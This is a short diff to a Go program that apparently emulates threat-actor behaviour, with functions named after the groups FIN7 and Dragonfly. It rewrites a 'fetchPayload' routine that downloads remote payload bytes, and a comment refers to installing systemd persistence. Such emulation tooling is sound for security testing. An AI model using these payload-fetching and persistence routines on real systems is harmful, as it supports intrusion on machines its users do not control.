@@ -2,13 +2,12 @@ package main
 
 import (
 	"fmt"
-	"io"
-	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
 	"syscall"
+	"time"
 )
 
 // ============================================================================
@@ -108,15 +107,14 @@ func fin7() {
 
 // fetchPayload downloads a URL and returns the raw bytes.
 func fetchPayload(url string) ([]byte, error) {
-	resp, err := http.Get(url)
+	code, body, err := rawHTTPGet(url, nil, 30*time.Second)
 	if err != nil {
 		return nil, err
 	}
-	defer resp.Body.Close()
-	if resp.StatusCode != 200 {
-		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
+	if code != 200 {
+		return nil, fmt.Errorf("HTTP %d", code)
 	}
-	return io.ReadAll(resp.Body)
+	return body, nil
 }
 
 // dragonfly installs systemd + storeDir persistence.
